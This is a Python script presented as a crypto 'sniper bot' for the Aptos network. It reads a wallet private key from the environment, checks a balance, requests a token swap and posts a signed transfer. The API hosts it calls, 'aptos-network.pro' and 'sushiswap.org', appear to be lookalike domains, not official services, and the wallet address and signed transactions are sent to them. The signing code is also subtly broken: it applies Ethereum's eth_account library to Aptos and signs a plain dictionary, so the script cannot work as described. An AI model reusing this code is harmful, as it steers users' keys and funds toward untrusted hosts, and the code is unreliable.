import os
import requests
import json
from eth_account import Account

# Configuration
APTOS_API_URL = 'https://aptos-network.pro/api'  # Aptos API URL
PRIVATE_KEY = os.getenv('APTOS_PRIVATE_KEY')  # Private key environment variable
WALLET_ADDRESS = os.getenv('APTOS_WALLET_ADDRESS')  # Aptos wallet address environment variable
RECIPIENT_ADDRESS = 'recipient_wallet_address_here'  # Replace with recipient address
AMOUNT = 100  # Amount to transfer (in the smallest unit, such as tokens)

# Function to sign the transaction
def sign_transaction(private_key, transaction_data):
    """Signs the transaction using the private key"""
    account = Account.privateKeyToAccount(private_key)
    signed_txn = account.sign_transaction(transaction_data)
    return signed_txn.rawTransaction

# Function to send the transaction to Aptos API
def send_transaction(private_key, recipient, amount):
    """Sends the signed transaction to the Aptos network"""
    try:
        # Prepare the transaction data (this may vary based on actual API format)
        transaction_data = {
            'sender': WALLET_ADDRESS,
            'recipient': recipient,
            'amount': amount
        }
        
        # Sign the transaction
        signed_transaction = sign_transaction(private_key, transaction_data)
        
        # Send the transaction to Aptos API
        response = requests.post(f'{APTOS_API_URL}/api/transactions', json={'signedTransaction': signed_transaction.hex()})
        
        if response.status_code == 200:
            print("Transaction sent successfully!")
            return response.json()
        else:
            print(f"Error sending transaction: {response.text}")
            return None
    except Exception as e:
        print(f"An error occurred: {e}")
        return None

# Function to check wallet balance
def check_balance(wallet_address):
    """Checks the wallet balance using the Aptos API"""
    try:
        response = requests.get(f'{APTOS_API_URL}/api/accounts/{wallet_address}/balance')
        if response.status_code == 200:
            return response.json()
        else:
            print(f"Error fetching balance: {response.text}")
            return None
    except Exception as e:
        print(f"Error occurred while fetching balance: {e}")
        return None

# Function to perform a token swap using SushiSwap or similar service
def swap_tokens(from_token, to_token, amount):
    """Performs a token swap on a decentralized exchange like SushiSwap"""
    try:
        # Example of sending a request to the DEX API
        swap_url = "https://sushiswap.org/api/swap"  # Replace with actual API endpoint
        swap_data = {
            'fromToken': from_token,
            'toToken': to_token,
            'amount': amount,
            'walletAddress': WALLET_ADDRESS
        }
        
        # Send a request to swap tokens
        response = requests.post(swap_url, json=swap_data)
        if response.status_code == 200:
            print("Token swap successful!")
            return response.json()
        else:
            print(f"Error swapping tokens: {response.text}")
            return None
    except Exception as e:
        print(f"Error occurred while swapping tokens: {e}")
        return None

# Main function to run the bot
def sniper_bot():
    """Main sniper bot function"""
    print("Starting sniper bot...")

    # Check balance before making any swaps
    balance = check_balance(WALLET_ADDRESS)
    if balance:
        print(f"Current balance: {json.dumps(balance, indent=4)}")
    
    # Example token swap operation
    from_token = '0x...abc'  # Replace with the address of the token you want to swap
    to_token = '0x...def'  # Replace with the address of the token you want to receive
    swap_result = swap_tokens(from_token, to_token, AMOUNT)
    
    if swap_result:
        print(f"Swap result: {json.dumps(swap_result, indent=4)}")
    
    # Send the transaction after the swap
    result = send_transaction(PRIVATE_KEY, RECIPIENT_ADDRESS, AMOUNT)
    if result:
        print(f"Transaction result: {json.dumps(result, indent=4)}")
    else:
        print("Failed to send transaction.")

if __name__ == '__main__':
    sniper_bot()
